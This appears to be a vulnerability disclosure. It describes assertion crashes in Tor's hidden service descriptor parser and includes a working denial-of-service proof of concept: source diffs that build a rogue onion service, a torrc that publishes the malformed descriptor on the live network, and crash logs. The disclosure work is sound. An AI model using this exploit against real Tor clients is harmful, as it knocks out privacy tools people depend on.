# Multiple Assertion Vulnerabilities in Hidden Service Descriptor Parsing

## Abstract

Hidden service descriptor parsing contains multiple tokens with optional objects (OBJ_OK) where the code assumes the object is present, leading to assertion failures and denial of service.

# Multiple Assertion Vulnerabilities in Hidden Service Descriptor Parsing

## Vulnerable code

The hidden service descriptor parser (`src/feature/hs/hs_descriptor.c`) uses a token table to define the syntax of introduction point sections. Two tokens are defined with `OBJ_OK` (object optional) but the parsing code assumes the object is always present, leading to `tor_assert(tok->object_body)` failures.

Token rules (lines 165-170):
```c
T1(str_ip_enc_key_cert, R3_INTRO_ENC_KEY_CERT, ARGS, OBJ_OK),
T01(str_ip_legacy_key_cert, R3_INTRO_LEGACY_KEY_CERT, ARGS, OBJ_OK),
```

Both tokens have `OBJ_OK`, meaning the object (a certificate) is optional. However, the parsing functions `decode_intro_point` and `decode_intro_legacy_key` contain assertions that `tok->object_body` is non‑NULL.

### First vulnerability: `R3_INTRO_LEGACY_KEY_CERT`

In `decode_intro_legacy_key` (lines 1770‑1800):
```c
tok = find_opt_by_keyword(tokens, R3_INTRO_LEGACY_KEY_CERT);
if (!tok) {
    log_warn(LD_REND, "Introduction point legacy key cert is missing");
    goto err;
}
tor_assert(tok->object_body);   // object may be NULL
```

### Second vulnerability: `R3_INTRO_ENC_KEY_CERT`

In `decode_intro_point` (lines 1930‑1940):
```c
tok = find_by_keyword(tokens, R3_INTRO_ENC_KEY_CERT);
tor_assert(tok->object_body);   // object may be NULL
```

Note that `R3_INTRO_ENC_KEY_CERT` is required (`T1`), but its object is optional. If the token appears without an object, `object_body` will be NULL, triggering the assertion.

## Attack scenario

A rogue hidden service operator crafts a v3 descriptor in which one introduction point's `enc-key-cert` line is emitted with no PEM object block. The descriptor is otherwise fully valid: the outer signature is produced with the legitimate HS signing key, and the encrypted layers are properly constructed. The malformed content is hidden inside the doubly-encrypted inner layer.

The rogue operator publishes the descriptor to the six HSDir relays responsible for the `.onion` address. Every Tor client that subsequently tries to connect to that address fetches the descriptor, verifies the outer signature, derives the subcredential from the `.onion` address, decrypts both encrypted layers, and then enters `decode_intro_point()` — where `tor_assert(tok->object_body)` fires and the process aborts.

### Affected nodes

The crash is **strictly limited to Tor clients** connecting to the rogue address. Other node types are not affected:

* **HSDir relays**: store the raw encrypted blob. They call only `hs_desc_decode_plaintext()` (outer header: version, blinded pubkey, signature) and never decrypt the inner layer. The call path is `cache_dir_desc_new()` → `hs_desc_decode_plaintext()` — `decode_intro_point()` is never reached. HSDirs also have no subcredential to perform decryption.
* **Guard / middle / exit relays**: relay cells; they never parse HS descriptor content.
* **Introduction point relays**: process `INTRODUCE` cells; they do not fetch or decode descriptors.
* **Rendezvous point relays**: process `RENDEZVOUS` cells; same.

The full decode chain that reaches the crash — `hs_desc_decode_descriptor()` → `hs_desc_decode_superencrypted()` → `hs_desc_decode_encrypted()` → `decode_intro_point()` — is only executed by a client that knows the target `.onion` address and is actively trying to connect to it.

### Multiplier effect

Because the malicious descriptor is served by six HSDir relays to every client that requests it, a single published descriptor is sufficient to crash all clients attempting to reach the address. The rogue HS republishes automatically approximately every hour, maintaining the attack indefinitely with no further attacker action.

### Proof of concept

Two separate Tor 0.4.9.8 builds are used:

* **rogue** — a modified build that acts as the malicious hidden service operator. It generates and publishes a poisoned descriptor to the live Tor network.
* **target** — an unmodified build that acts as the victim Tor client. It fetches the descriptor and crashes.

Two source changes are applied to the rogue build only.

**Modification 1 — `encode_enc_key()` in `src/feature/hs/hs_descriptor.c`**

The function that serialises an introduction point's encryption key certificate is changed to emit the `enc-key-cert` keyword with no following PEM object block:

```diff
   if (tor_cert_encode_ed22519(ip->enc_key_cert, &encoded_cert) < 0) {
     goto done;
   }
   tor_asprintf(&encoded,
                "%s ntor %s\n"
-               "%s\n%s",
+               "%s",
                str_ip_enc_key, key_b64,
-               str_ip_enc_key_cert, encoded_cert);
+               str_ip_enc_key_cert);
   tor_free(encoded_cert);
```

The resulting inner plaintext contains a bare `enc-key-cert` line with no `-----BEGIN`/`-----END` block. Because the token is declared `OBJ_OK`, the parser accepts it and sets `tok->object_body = NULL`. The subsequent unconditional `tor_assert(tok->object_body)` in `decode_intro_point()` then aborts the victim process.

**Modification 2 — `hs_desc_encode_descriptor()` in `src/feature/hs/hs_descriptor.c`**

Tor normally re-decodes a descriptor immediately after encoding it to verify round-trip symmetry. That self-check would trigger the same assertion inside the rogue process before the descriptor reaches the network. The check is disabled:

```diff
-  bool do_round_trip_test = !descriptor_cookie;
+  /* dopl-poc: disable round-trip validation so rogue can publish the
+   * intentionally malformed descriptor (no PEM body on enc-key-cert). */
+  bool do_round_trip_test = false;
+  (void)descriptor_cookie;
```

With both changes applied, the rogue binary is compiled (`make -j$(nproc)`). Start the rogue process with the following `torrc` and wait for it to bootstrap and publish its descriptor (log line: `"HS descriptor has been successfully uploaded"`):
```conf
# No relay, pure client + HS
ORPort 0
SocksPort 0

DataDirectory /tmp/tor-poc-dopl/rogue-data

# Hidden service — the poisoned descriptor is published here
HiddenServiceDir /tmp/tor-poc-dopl/rogue-hs
HiddenServicePort 80 127.0.0.1:19999
HiddenServiceVersion 3

# Logging — include full timestamp and debug for hs subsystem
Log notice stdout
Log notice file /tmp/tor-poc-dopl/rogue.log
SafeLogging 0
```

Once the `.onion` hostname is available in `HiddenServiceDir/hostname`, connect a standard Tor client (no source modifications) via its SOCKS5 port to that address. The victim client fetches the descriptor from the HSDir network, verifies the outer signature (which is valid), decrypts both encrypted layers (which succeed), and then enters `decode_intro_point()` where the assertion fires.

### Observed results

Running the above test against a latest Tor build with assertions enabled, when accessing the hidden service onion hostname results in:

```
May 20 11:45:18.000 [err] tor_assertion_failed_(): Bug: src/feature/hs/hs_descriptor.c:1932: decode_introduction_point: Assertion tok->object_body failed; aborting. (on Tor 0.4.9.8 )
May 20 11:45:18.000 [err] Bug: Tor 0.4.9.8: Assertion tok->object_body failed in decode_introduction_point at src/feature/hs/hs_descriptor.c:1932: . Stack trace: (on Tor 0.4.9.8 )
May 20 11:45:18.000 [err] Bug:     target/src/app/tor(log_backtrace_impl+0x5b) [0x64a4ee9ffeeb] (on Tor 0.4.9.8 )
May 20 11:45:18.000 [err] Bug:     target/src/app/tor(tor_assertion_failed_+0x14b) [0x64a4eea0b0db] (on Tor 0.4.9.8 )
May 20 11:45:18.000 [err] Bug:     target/src/app/tor(+0x20c1d4) [0x64a4eeb1d1d4] (on Tor 0.4.9.8 )
May 20 11:45:18.000 [err] Bug:     target/src/app/tor(hs_desc_decode_descriptor+0x156) [0x64a4eeb1d546] (on Tor 0.4.9.8 )
May 20 11:45:18.000 [err] Bug:     target/src/app/tor(hs_client_decode_descriptor+0x9d) [0x64a4eeb10eed] (on Tor 0.4.9.8 )
May 20 11:45:18.000 [err] Bug:     target/src/app/tor(hs_cache_store_as_client+0x46) [0x64a4eeb0a186] (on Tor 0.4.9.8 )
May 20 11:45:18.000 [err] Bug:     target/src/app/tor(hs_client_dir_fetch_done+0x8b) [0x64a4eeb1253b] (on Tor 0.4.9.8 )
May 20 11:45:18.000 [err] Bug:     target/src/app/tor(connection_dir_reached_eof+0xa66) [0x64a4eeade216] (on Tor 0.4.9.8 )
May 20 11:45:18.000 [err] Bug:     target/src/app/tor(+0x1a0bab) [0x64a4eeab1bab] (on Tor 0.4.9.8 )
May 20 11:45:18.000 [err] Bug:     target/src/app/tor(+0x6fded) [0x64a4ee980ded] (on Tor 0.4.9.8 )
May 20 11:45:18.000 [err] Bug:     /lib/x86_64-linux-gnu/libevent-2.1.so.7(+0x20b3c) [0x78e410df5b3c] (on Tor 0.4.9.8 )
May 20 11:45:18.000 [err] Bug:     /lib/x86_64-linux-gnu/libevent-2.1.so.7(event_base_loop+0x4af) [0x78e410df748f] (on Tor 0.4.9.8 )
May 20 11:45:18.000 [err] Bug:     target/src/app/tor(do_main_loop+0xd1) [0x64a4ee982131] (on Tor 0.4.9.8 )
May 20 11:45:18.000 [err] Bug:     target/src/app/tor(tor_run_main+0x1d5) [0x64a4ee97d895] (on Tor 0.4.9.8 )
May 20 11:45:18.000 [err] Bug:     target/src/app/tor(tor_main+0x5d) [0x64a4ee979bad] (on Tor 0.4.9.8 )
May 20 11:45:18.000 [err] Bug:     target/src/app/tor(main+0x1d) [0x64a4ee97973d] (on Tor 0.4.9.8 )
May 20 11:45:18.000 [err] Bug:     /lib/x86_64-linux-gnu/libc.so.6(+0x2a1ca) [0x78e41042a1ca] (on Tor 0.4.9.8 )
May 20 11:45:18.000 [err] Bug:     /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0x8b) [0x78e41042a28b] (on Tor 0.4.9.8 )
May 20 11:45:18.000 [err] Bug:     target/src/app/tor(_start+0x25) [0x64a4ee979795] (on Tor 0.4.9.8 )
Aborted (core dumped)
```

The Tor daemon terminates, causing denial of service.

## Impact

Any Tor client that attempts to connect to a hidden service whose operator has published a malformed descriptor will crash immediately upon fetching the descriptor. The victim client aborts with `SIGABRT` and must be restarted manually.

HSDir relays, guard relays, middle relays, exit relays, and introduction point relays are **not** affected. The crash is confined to the connecting client because decrypting the inner descriptor layer — and thus reaching the vulnerable code — requires the subcredential derived from the target `.onion` address, which only a connecting client possesses.

The attack has no prerequisites beyond controlling a hidden service's signing key (i.e., running a hidden service). The attacker does not need to compromise any relay, perform any man-in-the-middle operation, or interact directly with the victim.